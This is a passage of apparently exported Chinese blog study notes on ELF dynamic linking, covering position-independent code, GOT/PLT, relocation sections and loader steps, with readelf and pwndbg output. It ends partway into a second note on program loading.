    <url>/2024/08/16/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E9%93%BE%E6%8E%A5%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93/%E5%85%B3%E4%BA%8E%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/</url>
    <content><![CDATA[<p>十分复杂，入坑需谨慎。。。。。</p>
<h1 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h1><blockquote>
<p>本次学习用的demo</p>
</blockquote>
<p>简述一下和静态链接的区别：静态链接在链接过程中就已经完成了重定位工作，因此可执行文件巨大，动态链接就是为了解决这一问题，找到了一种模块化的实现方法，就是可执行文件并不把所有库内段合并过来，而是在runtime的时候完成symbols的relocate操作，并且不同的进程也可以共享动态链接库也就是.so。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gcc -fPIC -shared -o Lib.so lib.c</span><br><span class="line">gcc -o program2 program2.c ./Lib.so</span><br><span class="line">gcc -o program1 program1.c ./Lib.so</span><br><span class="line"><span class="comment">/*program1*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;lib.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    foobar(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*program2*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;lib.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    foobar(<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 注意这里的 &#x27;o&#x27; 应该是 &#x27;0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*lib.c*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">foobar</span><span class="params">(<span class="type">int</span> i)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Printing from Lib.so: %d\n&quot;</span>, i); <span class="comment">// 注意这里的 &#x27;din&#x27; 应该是 &#x27;%d&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*lib.h*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> LIB_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LIB_H</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">foobar</span><span class="params">(<span class="type">int</span> i)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<h1 id="PIC"><a href="#PIC" class="headerlink" title="PIC"></a>PIC</h1><blockquote>
<p>为了了解可执行文件（动态链接库）是如何在runtime进行relocate的需要理解什么是position-independent code，也就是地址无关代码。静态链接库是没有这个概念的，其加载地址在链接中已经确定了，所谓PIC就是解决动态共享库在加载时的模块地址冲突问题的，使其可以加载到任何位置，也就是说运行时地址自动分配，但是也会导致问题，同一个模块的代码装载到不同的位置，指令不能发生变化，否则无法使用其他共享模块。</p>
<p>需要注意一点的是，动态链接库实现代码重用，但是每一个进程是有一份数据部分的副本的。</p>
</blockquote>
<h2 id="如何实现"><a href="#如何实现" class="headerlink" title="如何实现"></a>如何实现</h2><blockquote>
<p>基本思想就是把指令中需要修改的部分提取出来跟数据放一块</p>
<p>所谓需要修改的无非就是外部模块的地址引用</p>
</blockquote>
<p>地址引用可以分为以下四种：</p>
<ul>
<li><p>模块内部函数调用跳转</p>
<p>比较简单，不做讨论，直接相对寻址即可，但是一开始貌似都是要到got表中的，但是本质区别是要不要做符号重定位。</p>
</li>
<li><p>模块内部数据访问，static关键字</p>
<p><img src="/img/mypic/PIC.png" alt="PIC"></p>
<p>书中是上面那样写的，但是我自己在ida编译了一个64位的程序，发现不管是内部模块的函数还是外部模块的函数都会转移到got表访问，数据回到got，函数会到got.plt</p>
</li>
<li><p>模块外部函数调用和跳转</p>
<blockquote>
<p>找got表</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> a;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> b; </span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">ext</span><span class="params">()</span>;  </span><br><span class="line"><span class="type">void</span> <span class="title function_">bar</span><span class="params">()</span> &#123;</span><br><span class="line">    a = <span class="number">1</span>;</span><br><span class="line">    b = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">foo</span><span class="params">()</span>&#123;</span><br><span class="line">    bar();</span><br><span class="line">    ext();</span><br><span class="line">&#125;</span><br><span class="line">gcc -fPIC -shared -o pic.so pic.c</span><br><span class="line"> <span class="number">18</span> .got          <span class="number">00000028</span>  <span class="number">0000000000003f</span>d8  <span class="number">0000000000003f</span>d8  <span class="number">00002f</span>d8  <span class="number">2</span>**<span class="number">3</span></span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br><span class="line"> <span class="number">19</span> .got.plt      <span class="number">00000028</span>  <span class="number">0000000000004000</span>  <span class="number">0000000000004000</span>  <span class="number">00003000</span>  <span class="number">2</span>**<span class="number">3</span></span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br><span class="line">DYNAMIC RELOCATION RECORDS</span><br><span class="line">OFFSET           TYPE              VALUE </span><br><span class="line"><span class="number">0000000000003e48</span> R_X86_64_RELATIVE  *ABS*+<span class="number">0x0000000000001130</span></span><br><span class="line"><span class="number">0000000000003e50</span> R_X86_64_RELATIVE  *ABS*+<span class="number">0x00000000000010f0</span></span><br><span class="line"><span class="number">0000000000004028</span> R_X86_64_RELATIVE  *ABS*+<span class="number">0x0000000000004028</span></span><br><span class="line"><span class="number">0000000000003f</span>d8 R_X86_64_GLOB_DAT  b</span><br><span class="line"><span class="number">0000000000003f</span>e0 R_X86_64_GLOB_DAT  __cxa_finalize</span><br><span class="line"><span class="number">0000000000003f</span>e8 R_X86_64_GLOB_DAT  _ITM_registerTMCloneTable</span><br><span class="line"><span class="number">0000000000003f</span>f0 R_X86_64_GLOB_DAT  _ITM_deregisterTMCloneTable</span><br><span class="line"><span class="number">0000000000003f</span>f8 R_X86_64_GLOB_DAT  __gmon_start__</span><br><span class="line"><span class="number">0000000000004018</span> R_X86_64_JUMP_SLOT  ext</span><br><span class="line"><span class="number">0000000000004020</span> R_X86_64_JUMP_SLOT  ba</span><br></pre></td></tr></table></figure>
</li>
<li><p>模块外部的数据访问</p>
<blockquote>
<p>也是got表</p>
</blockquote>
</li>
<li><p>特别：</p>
<blockquote>
<p>对于定义在模块内部的全局变量，也通过got表进行处理。</p>
</blockquote>
<pre><code>      ## 关于数据段地址无关性
</code></pre>
</li>
</ul>
<p>因为每一个模块都有副本，因此不太需要关于共享这个问题，直接重定位即可。</p>
<h1 id="关于PLT"><a href="#关于PLT" class="headerlink" title="关于PLT"></a>关于PLT</h1><p>所谓延迟绑定，就是当函数第一次使用时才进行重定位操作（符号绑定），也就是说PIC代码不直接指向got.plt表，而是指向plt表，在第一次调用时，先进行dl-resolve函数操作，之后进行符号绑定。但是貌似好多已经优化掉了，这一步感觉好多elf已经不存在了，就直接跳到got表，程序执行的时候就进行装载。。。。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">默认选项编译的代码，还没有执行的printf，可以看到plt中已经不会蹦到dl-resolve代码上去了，直接跳到了got表。。。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">pwndbg&gt; disassemble <span class="number">0x555555555050</span>,+<span class="number">30</span></span><br><span class="line">Dump of assembler code from <span class="number">0x555555555050</span> to <span class="number">0x55555555506e</span>:</span><br><span class="line">   <span class="number">0x0000555555555050</span> &lt;<span class="built_in">printf</span>@plt+<span class="number">0</span>&gt;:   endbr64 </span><br><span class="line">   <span class="number">0x0000555555555054</span> &lt;<span class="built_in">printf</span>@plt+<span class="number">4</span>&gt;:   bnd jmp QWORD PTR [rip+<span class="number">0x2f75</span>]        # <span class="number">0x555555557fd0</span> &lt;<span class="built_in">printf</span>@got.plt&gt;</span><br><span class="line">   <span class="number">0x000055555555505b</span> &lt;<span class="built_in">printf</span>@plt+<span class="number">11</span>&gt;:  nop    DWORD PTR [rax+rax*<span class="number">1</span>+<span class="number">0x0</span>]</span><br><span class="line">   <span class="number">0x0000555555555060</span> &lt;_start+<span class="number">0</span>&gt;:       endbr64 </span><br><span class="line">   <span class="number">0x0000555555555064</span> &lt;_start+<span class="number">4</span>&gt;:       xor    ebp,ebp</span><br><span class="line">   <span class="number">0x0000555555555066</span> &lt;_start+<span class="number">6</span>&gt;:       mov    r9,rdx</span><br><span class="line">   <span class="number">0x0000555555555069</span> &lt;_start+<span class="number">9</span>&gt;:       pop    rsi</span><br><span class="line">   <span class="number">0x000055555555506a</span> &lt;_start+<span class="number">10</span>&gt;:      mov    rdx,rsp</span><br><span class="line">   <span class="number">0x000055555555506d</span> &lt;_start+<span class="number">13</span>&gt;:      and    rsp,<span class="number">0xfffffffffffffff0</span></span><br><span class="line">End of assembler dump.</span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>gx <span class="number">0x555555557fd0</span></span><br><span class="line"><span class="number">0x555555557fd0</span> &lt;<span class="built_in">printf</span>@got.plt&gt;:        <span class="number">0x00007ffff7de96f0</span>      <span class="number">0x00007ffff7db2dc0</span></span><br><span class="line"><span class="number">0x555555557fe0</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555557ff0</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x00007ffff7dce9a0</span></span><br><span class="line"><span class="number">0x555555558000</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000555555558008</span></span><br><span class="line"><span class="number">0x555555558010</span> &lt;completed<span class="number">.0</span>&gt;:   <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555558020</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555558030</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555558040</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555558050</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555558060</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>

<h1 id="ELF文件相关"><a href="#ELF文件相关" class="headerlink" title="ELF文件相关"></a>ELF文件相关</h1><blockquote>
<p>在了解了动态链接的基本思想之后，再来从ELF文件的角度细节理解一下</p>
<p>总体概览是：1.读取program_header，os来分配页表映射关系；（和静态链接一样）</p>
<p>2.同样加载动态链接器，os将控制权交给动态链接器</p>
<p>3.动态链接器经过一些列操作，如bootstrap等等，对可执行文件进行链接操作，然后将控制权交给可执行文件。</p>
<p>4.程序执行。</p>
</blockquote>
<h2 id="interp节"><a href="#interp节" class="headerlink" title=".interp节"></a>.interp节</h2><blockquote>
<p>描述了动态链接器的存储路径，一个字符数组</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">root@L:/home/l/c++/dynamiclink<span class="meta"># readelf -x 1 hh</span></span><br><span class="line"></span><br><span class="line">Hex dump of section <span class="string">&#x27;.interp&#x27;</span>:</span><br><span class="line">  <span class="number">0x00000318</span> <span class="number">2f</span>6c6962 <span class="number">36342f</span>6c <span class="number">642</span>d6c69 <span class="number">6e75782</span>d /lib64/ld-linux-</span><br><span class="line">  <span class="number">0x00000328</span> <span class="number">7838362</span>d <span class="number">36342e73</span> <span class="number">6f</span>2e3200          x86<span class="number">-64.</span>so<span class="number">.2</span>.</span><br></pre></td></tr></table></figure>

<h2 id="dynamic节"><a href="#dynamic节" class="headerlink" title=".dynamic节"></a>.dynamic节</h2><blockquote>
<p>和符号表类似，也是一个结构体数组，这大概就是描述一个可执行文件重定位信息的一个集合体。</p>
<p>类似于重定位头，跟节表头差不多</p>
<p>其中有动态符号表的文件偏移。。。。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*其中元素结构为*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int64_t</span> Elf64_Sxword;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint64_t</span> Elf64_Xword;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint64_t</span> Elf64_Addr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Sxword	d_tag;			<span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      Elf64_Xword d_val;		<span class="comment">/* Integer value */</span></span><br><span class="line">      Elf64_Addr d_ptr;			<span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf64_Dyn;</span><br></pre></td></tr></table></figure>

<h2 id="dynsym节"><a href="#dynsym节" class="headerlink" title=".dynsym节"></a>.dynsym节</h2><blockquote>
<p>结构基本symtab一样，只是把需要动态绑定的拿出来，组成的一张表</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">root@L:/home/l/c++/dynamiclink<span class="meta"># readelf -s hh</span></span><br><span class="line"></span><br><span class="line">Symbol table <span class="string">&#x27;.dynsym&#x27;</span> contains <span class="number">7</span> entries:</span><br><span class="line">   Num:    Value          Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     <span class="number">0</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT  UND </span><br><span class="line">     <span class="number">1</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2<span class="number">.34</span> (<span class="number">2</span>)</span><br><span class="line">     <span class="number">2</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> NOTYPE  WEAK   DEFAULT  UND _ITM_deregisterT[...]</span><br><span class="line">     <span class="number">3</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2<span class="number">.2</span><span class="number">.5</span> (<span class="number">3</span>)</span><br><span class="line">     <span class="number">4</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> NOTYPE  WEAK   DEFAULT  UND __gmon_start__</span><br><span class="line">     <span class="number">5</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMC[...]</span><br><span class="line">     <span class="number">6</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FUNC    WEAK   DEFAULT  UND [...]@GLIBC_2<span class="number">.2</span><span class="number">.5</span> (<span class="number">3</span>)</span><br></pre></td></tr></table></figure>

<h2 id="关于重定位节"><a href="#关于重定位节" class="headerlink" title="关于重定位节"></a>关于重定位节</h2><blockquote>
<p>好像是一个搬运工的身份，其连接了动态符号表以及got表，通过检索动态符号表来将重定位后的值填入到got或got.plt</p>
<p>rela.dyn和rela.dyn的区分个人理解上比较模糊，貌似是通过重定位的类型来区分的，但是不能确定。</p>
<p>关于重定位类型，常见的有：R_X86_64_RELATIVE，R_X86_64_GLOB_DAT，R_X86_64_JUMP_SLO，R_X86_64_RELATIVE代表基址重置，其余两个貌似可以猜出来要干啥，说实话这两个名字的处理方式是一样的，知识跳的位置不一样罢了，其实基址重置也好理解，就是到最后目标位置的值得是装载地址加上addend。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@L:/home/l/c++/dynamiclink# readelf -r pic.so</span><br><span class="line"></span><br><span class="line">Relocation section &#x27;.rela.dyn&#x27; at offset 0x458 contains 8 entries:</span><br><span class="line">  Offset          Info           Type           Sym. Value    Sym. Name + Addend</span><br><span class="line">000000003e48  000000000008 R_X86_64_RELATIVE                    1130</span><br><span class="line">000000003e50  000000000008 R_X86_64_RELATIVE                    10f0</span><br><span class="line">000000004028  000000000008 R_X86_64_RELATIVE                    4028</span><br><span class="line">000000003fd8  000200000006 R_X86_64_GLOB_DAT 0000000000000000 b + 0</span><br><span class="line">000000003fe0  000300000006 R_X86_64_GLOB_DAT 0000000000000000 __cxa_finalize + 0</span><br><span class="line">000000003fe8  000400000006 R_X86_64_GLOB_DAT 0000000000000000 _ITM_registerTMCl[...] + 0</span><br><span class="line">000000003ff0  000500000006 R_X86_64_GLOB_DAT 0000000000000000 _ITM_deregisterTM[...] + 0</span><br><span class="line">000000003ff8  000600000006 R_X86_64_GLOB_DAT 0000000000000000 __gmon_start__ + 0</span><br><span class="line"></span><br><span class="line">Relocation section &#x27;.rela.plt&#x27; at offset 0x518 contains 2 entries:</span><br><span class="line">  Offset          Info           Type           Sym. Value    Sym. Name + Addend</span><br><span class="line">000000004018  000100000007 R_X86_64_JUMP_SLO 0000000000000000 ext + 0</span><br><span class="line">000000004020  000700000007 R_X86_64_JUMP_SLO 0000000000001139 bar + 0</span><br></pre></td></tr></table></figure>

<h3 id="rela-dyn-and-rela-plt"><a href="#rela-dyn-and-rela-plt" class="headerlink" title=".rela.dyn and .rela.plt"></a>.rela.dyn and .rela.plt</h3><blockquote>
<p>结构都是一样的，都是下面这种类型。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Addr	r_offset;		<span class="comment">/* Address */</span></span><br><span class="line">  Elf64_Xword	r_info;			<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">  Elf64_Sxword	r_addend;		<span class="comment">/* Addend */</span></span><br><span class="line">&#125; Elf64_Rela;</span><br></pre></td></tr></table></figure>

<h1 id="runtime辅助信息"><a href="#runtime辅助信息" class="headerlink" title="runtime辅助信息"></a>runtime辅助信息</h1><blockquote>
<p>上面讲的都是比较静态的，也就是还未分配页表等映射信息，当os加载程序之后，会初始化一些进程的堆栈信息，这样os转交给链接器的时候，链接器才能知道如何重定位，也就是说加载器负责将模块中的关键信息加载到进程堆栈，之后会调用解释器来进行重定位操作。	</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*辅助信息数组保存在堆栈*/</span></span><br><span class="line"><span class="comment">/* 这个向量通常仅供程序解释器使用。</span></span><br><span class="line"><span class="comment">   在 ABI 补充定义中通常使用 auxv_t 这个名字。</span></span><br><span class="line"><span class="comment">   这个向量通常不会在标准的 &lt;elf.h&gt; 文件中定义，但定义它也无妨。</span></span><br><span class="line"><span class="comment">   我们重命名它以避免冲突。这些类型的大小由 exec 服务器和程序解释器之间的协议决定，</span></span><br><span class="line"><span class="comment">   所以我们在此并未完全指定它们。*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">uint32_t</span> a_type;		<span class="comment">/* 条目类型 */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="type">uint32_t</span> a_val;		<span class="comment">/* 整数值 */</span></span><br><span class="line">      <span class="comment">/* 以前我们在这里添加了指针元素。</span></span><br><span class="line"><span class="comment">	 但是，由于在 32 位定义和 64 位平台之间使用时无法工作，</span></span><br><span class="line"><span class="comment">	 我们不能这样做。 */</span></span><br><span class="line">    &#125; a_un;</span><br><span class="line">&#125; Elf32_auxv_t;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">uint64_t</span> a_type;		<span class="comment">/* 条目类型 */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="type">uint64_t</span> a_val;		<span class="comment">/* 整数值 */</span></span><br><span class="line">      <span class="comment">/* 以前我们在这里添加了指针元素。</span></span><br><span class="line"><span class="comment">	 但是，由于在 32 位定义和 64 位平台之间使用时无法工作，</span></span><br><span class="line"><span class="comment">	 我们不能这样做。 */</span></span><br><span class="line">    &#125; a_un;</span><br><span class="line">&#125; Elf64_auxv_t;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="动态链接步骤"><a href="#动态链接步骤" class="headerlink" title="动态链接步骤"></a>动态链接步骤</h1><blockquote>
<p>数据结构了解之后来了解一下algorithm，没有代码，比较高视角（粗糙）。</p>
</blockquote>
<h2 id="第一步：链接器的自举"><a href="#第一步：链接器的自举" class="headerlink" title="第一步：链接器的自举"></a>第一步：链接器的自举</h2><p>链接器也是可执行文件，但是链接器的符号表的装载，got表的重定位也是需要链接器来完成，但是完成自身这一过程不能使用全局变量以及函数，因此叫做bootstrap，类似于自己生自己，中文叫自举。</p>
<h2 id="第二步：依赖模块的装载"><a href="#第二步：依赖模块的装载" class="headerlink" title="第二步：依赖模块的装载"></a>第二步：依赖模块的装载</h2><p>链接器通过阅读可执行文件的.dynamic等字段，将所有所需的模块分配虚拟内存，然后符号表会被合并为全局符号表，具体算法不是很清楚，但是理论上应该是可行的。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">此段含有装载时所需要的数据结构</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Dynamic section at offset <span class="number">0x2db8</span> contains <span class="number">28</span> entries:</span><br><span class="line">  Tag        Type                         Name/Value</span><br><span class="line"> <span class="number">0x0000000000000001</span> (NEEDED)             Shared library: [./Lib.so]</span><br><span class="line"> <span class="number">0x0000000000000001</span> (NEEDED)             Shared library: [libc.so<span class="number">.6</span>]</span><br><span class="line"> <span class="number">0x000000000000000c</span> (INIT)               <span class="number">0x1000</span></span><br><span class="line"> <span class="number">0x000000000000000d</span> (FINI)               <span class="number">0x1164</span></span><br><span class="line"> <span class="number">0x0000000000000019</span> (INIT_ARRAY)         <span class="number">0x3da8</span></span><br><span class="line"> <span class="number">0x000000000000001b</span> (INIT_ARRAYSZ)       <span class="number">8</span> (bytes)</span><br><span class="line"> <span class="number">0x000000000000001a</span> (FINI_ARRAY)         <span class="number">0x3db0</span></span><br><span class="line"> <span class="number">0x000000000000001c</span> (FINI_ARRAYSZ)       <span class="number">8</span> (bytes)</span><br><span class="line"> <span class="number">0x000000006ffffef5</span> (GNU_HASH)           <span class="number">0x3b0</span></span><br><span class="line"> <span class="number">0x0000000000000005</span> (STRTAB)             <span class="number">0x480</span></span><br><span class="line"> <span class="number">0x0000000000000006</span> (SYMTAB)             <span class="number">0x3d8</span></span><br><span class="line"> <span class="number">0x000000000000000a</span> (STRSZ)              <span class="number">152</span> (bytes)</span><br><span class="line"> <span class="number">0x000000000000000b</span> (SYMENT)             <span class="number">24</span> (bytes)</span><br><span class="line"> <span class="number">0x0000000000000015</span> (DEBUG)              <span class="number">0x0</span></span><br><span class="line"> <span class="number">0x0000000000000003</span> (PLTGOT)             <span class="number">0x3fb8</span></span><br><span class="line"> <span class="number">0x0000000000000002</span> (PLTRELSZ)           <span class="number">24</span> (bytes)</span><br><span class="line"> <span class="number">0x0000000000000014</span> (PLTREL)             RELA</span><br><span class="line"> <span class="number">0x0000000000000017</span> (JMPREL)             <span class="number">0x618</span></span><br><span class="line"> <span class="number">0x0000000000000007</span> (RELA)               <span class="number">0x558</span></span><br><span class="line"> <span class="number">0x0000000000000008</span> (RELASZ)             <span class="number">192</span> (bytes)</span><br><span class="line"> <span class="number">0x0000000000000009</span> (RELAENT)            <span class="number">24</span> (bytes)</span><br><span class="line"> <span class="number">0x000000000000001e</span> (FLAGS)              BIND_NOW</span><br><span class="line"> <span class="number">0x000000006ffffffb</span> (FLAGS_1)            Flags: NOW PIE</span><br><span class="line"> <span class="number">0x000000006ffffffe</span> (VERNEED)            <span class="number">0x528</span></span><br><span class="line"> <span class="number">0x000000006fffffff</span> (VERNEEDNUM)         <span class="number">1</span></span><br><span class="line"> <span class="number">0x000000006ffffff0</span> (VERSYM)             <span class="number">0x518</span></span><br><span class="line"> <span class="number">0x000000006ffffff9</span> (RELACOUNT)          <span class="number">3</span></span><br><span class="line"> <span class="number">0x0000000000000000</span> (<span class="literal">NULL</span>)               <span class="number">0x0</span></span><br></pre></td></tr></table></figure>

<p>这一部分还涉及到global symbol interpose的问题，就是符号冲突的话，那么第二个加载的符号会被忽略，这也解答了之前非常奇怪的问题，就是为什么模块内函数也要重定位到got表，这就是为了防止外部符号覆盖。</p>
<h2 id="第三步：重定位和初始化"><a href="#第三步：重定位和初始化" class="headerlink" title="第三步：重定位和初始化"></a>第三步：重定位和初始化</h2><p>就是通过重定位段来进行got和got.plt表的装载。重定位之后，若库中有.ini段，那么会执行其中代码，来进行全局对象的构造和初始化，退出时也会执行.fini中的代码，尽心全局对象的销毁操作。在这之后就可以把控制权交给程序入口了。</p>
]]></content>
      <categories>
        <category>读书笔记</category>
        <category>程序员的自我修养，链接装载与库</category>
      </categories>
      <tags>
        <tag>读书笔记</tag>
        <tag>程序员的自我修养，链接装载与库</tag>
      </tags>
  </entry>
  <entry>
    <title>程序装载简析</title>
    <url>/2024/08/16/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E9%93%BE%E6%8E%A5%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93/%E7%A8%8B%E5%BA%8F%E8%A3%85%E8%BD%BD%E7%AE%80%E6%9E%90/</url>
    <content><![CDATA[<p>作为一个高视角的科普吧，动态链接在装载过程中做了非常复杂的操作，还需要深入学习。</p>
<h2 id="关于分段和分页"><a href="#关于分段和分页" class="headerlink" title="关于分段和分页"></a>关于分段和分页</h2><p>核心思想就是虚拟化，如何共用同一块内存，如何实现物理内存的复用，MMU和交换空间的发展使之一步一步成为可能，至于如何进行换页，如何进行映射这是OS该管的事，OS使用MMU提供的接口实现一些列换页算法，如LRU等等，装载器的实现的核心代码也是定义在内核中的，主要分为以下几步：</p>
<p><img src="/img/mypic/load.png" alt="load"></p>
<p>按我的理解就是，根据elf的各个段的大小以及类型等各个字段，来建立虚拟内存和文件系统以及物理内存之间的映射关系（俗称页表）。当然进程管理系统，也应该做事，这里只讨论文件装载。决定装载的映射关系的一个重要的地方就是内部碎片和外部碎片，感觉这两个非常矛盾，需要trade-off。段页式管理，多级页表虽然缓解了外部碎片，但是同样加剧了内部碎片，使本应该不占一个页的段，占据一个页空间。感觉这里面极度需要平衡，至于该如何装载那就是OS的事了。但是装载之前elf也是做了一些工作，可执行文件有一个叫程序头的东西，俗称段表，貌似也可以对装载的过程一窥一二。</p>
<h2 id="program-header"><a href="#program-header" class="headerlink" title="program header"></a>program header</h2><blockquote>
<p>其中描述了各个段的信息，大概就是描述了什么文件偏移该映射到什么地方，但是程序是有pie这个选项的，不知道内核是如何处理的。，可以观察到段表比节表少了好多，段表会将部分节表进行合并导致的。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Word	p_type;			<span class="comment">/* Segment type */</span></span><br><span class="line">  Elf64_Word	p_flags;		<span class="comment">/* Segment flags */</span></span><br><span class="line">  Elf64_Off	p_offset;		<span class="comment">/* Segment file offset */</span></span><br><span class="line">  Elf64_Addr	p_vaddr;		<span class="comment">/* Segment virtual address */</span></span><br><span class="line">  Elf64_Addr	p_paddr;		<span class="comment">/* Segment physical address */</span></span><br><span class="line">  Elf64_Xword	p_filesz;		<span class="comment">/* Segment size in file */</span></span><br><span class="line">  Elf64_Xword	p_memsz;		<span class="comment">/* Segment size in memory */</span></span><br><span class="line">  Elf64_Xword	p_align;		<span class="comment">/* Segment alignment */</span></span><br><span class="line">&#125; Elf64_Phdr;</span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type             Address           Offset</span><br><span class="line">       Size              EntSize          Flags  Link  Info  Align</span><br><span class="line">  [ <span class="number">0</span>]                   <span class="literal">NULL</span>             <span class="number">0000000000000000</span>  <span class="number">00000000</span></span><br><span class="line">       <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>           <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span></span><br><span class="line">  [ <span class="number">1</span>] .interp           PROGBITS         <span class="number">0000000000000318</span>  <span class="number">00000318</span></span><br><span class="line">       <span class="number">000000000000001</span>c  <span class="number">0000000000000000</span>   A       <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">  [ <span class="number">2</span>] .note.gnu.pr[...] NOTE             <span class="number">0000000000000338</span>  <span class="number">00000338</span></span><br><span class="line">       <span class="number">0000000000000030</span>  <span class="number">0000000000000000</span>   A       <span class="number">0</span>     <span class="number">0</span>     <span class="number">8</span></span><br><span class="line">  [ <span class="number">3</span>] .note.gnu.bu[...] NOTE             <span class="number">0000000000000368</span>  <span class="number">00000368</span></span><br><span class="line">       <span class="number">0000000000000024</span>  <span 